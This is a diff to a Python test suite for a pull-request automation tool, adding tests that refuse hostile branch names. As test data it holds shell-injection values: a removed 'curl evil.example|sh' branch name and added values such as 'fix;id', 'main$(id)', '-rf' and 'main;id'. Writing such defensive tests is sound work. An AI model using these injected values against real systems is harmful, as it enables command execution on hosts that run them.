@@ -109,9 +109,12 @@ def test_a_dry_spawn_writes_the_intent_then_closes_it_with_the_argv_it_would_run
     (lambda p: p.update(labels=[{"name": "hold"}]), "held"),
     (lambda p: p.update(isDraft=True), "draft"),
     (lambda p: p.update(author={"login": "app/dependabot"}), "Dependabot"),
-    # A branch name the brief would carry into a command the driver runs.
-    (lambda p: p.update(headRefName="fix;curl evil.example|sh"), "plain ref name"),
-    (lambda p: p.update(baseRefName="main$(id)"), "plain ref name"),
+    # A branch name the brief would carry into a command the driver runs, judged on its raw name.
+    (lambda p: p.update(headRefName="fix;id"), "head branch"),
+    (lambda p: p.update(headRefName="-rf"), "head branch"),
+    (lambda p: p.update(headRefName="main\u00a0"), "head branch"),  # the guard would show it as "main"
+    (lambda p: p.update(baseRefName="main$(id)"), "base branch"),
+    (lambda p: p.update(baseRefName="crm/main"), "base branch"),     # the guard would show it as [withheld]
 ])
 def test_a_spawn_is_refused_for_a_held_draft_or_dependabot_pr(world, change, why):
     prs = _prs(world)
@@ -471,3 +474,34 @@ def test_a_pr_file_list_github_capped_is_refused_not_read_as_complete(tmp_path, 
         monkeypatch.setenv("STUB_TOTAL", total)
         with pytest.raises(sources.SourceError, match="listed 2 of o/r#1"):
             src.pr_files("o/r", 1)
+
+
+def _brief(world, monkeypatch, now=LATER):
+    from fleetlib import profile
+    seen = []
+    real = profile.driver_argv
+    monkeypatch.setattr(profile, "driver_argv", lambda sec, key, prof, brief: seen.append(brief) or real(sec, key, prof,
+                                                                                                         brief))
+    res = _act(world, now=now).spawn(WS, 849)
+    return res, (seen or [""])[0]
+
+
+def test_the_driver_brief_carries_the_pr_number_and_plain_branches(world, monkeypatch):
+    prs = _prs(world)
+    next(p for p in prs if p["number"] == 849).update(headRefName="feat/x-1.2_y", baseRefName="release/2026.10")
+    _write_prs(world, prs)
+    _files(world, 849, [])
+    res, brief = _brief(world, monkeypatch)
+    assert res["ok"], res
+    assert "pull request broomva/workspace#849 (branch feat/x-1.2_y, base release/2026.10)" in brief
+    assert "/pulls/849/update-branch" in brief and "git lfs ls-files origin/release/2026.10 HEAD" in brief
+
+
+def test_a_hostile_default_branch_is_refused_when_the_pr_names_no_base(world, monkeypatch):
+    prs = _prs(world)
+    next(p for p in prs if p["number"] == 849).pop("baseRefName", None)
+    _write_prs(world, prs)
+    _files(world, 849, [])
+    (world.fixture / "gh" / "broomva__workspace" / "default_branch.txt").write_text("main;id\n")
+    res, brief = _brief(world, monkeypatch)
+    assert not res["ok"] and "base branch" in res["detail"] and brief == ""
